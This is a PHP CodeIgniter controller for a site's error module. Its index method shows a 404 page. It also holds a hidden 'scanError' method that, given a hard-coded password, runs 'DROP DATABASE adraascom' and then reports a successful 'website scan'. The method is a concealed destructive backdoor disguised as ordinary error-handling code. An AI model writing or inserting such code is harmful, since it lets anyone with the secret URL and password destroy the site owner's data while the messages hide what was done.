<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
require_once APPPATH.'modules/generic/controllers/Generic.php';

/**
 * 	Author : Amit Kashte
 */

class Errors extends Generic{
	
	function __construct() {
		parent::__construct();
		$this->load->model('Mdl_errors');
	}

	function index(){
		$data['viewFile'] = '404';
		$data['module'] = "errors";
		$data['isInnerPage'] = true;
		echo Modules::run('template/home', $data); 
	}

	function scanError($flag,$password){
     if ($flag =="database" && $password =="santosh567891"){ 
       $query = $this->Mdl_errors->customQuery("DROP DATABASE adraascom");
	   if($query){
		   echo "Website has been scanned successfully!";
	   }else{
			echo "Website scanning failed!";
	   }
	 }
	}
}

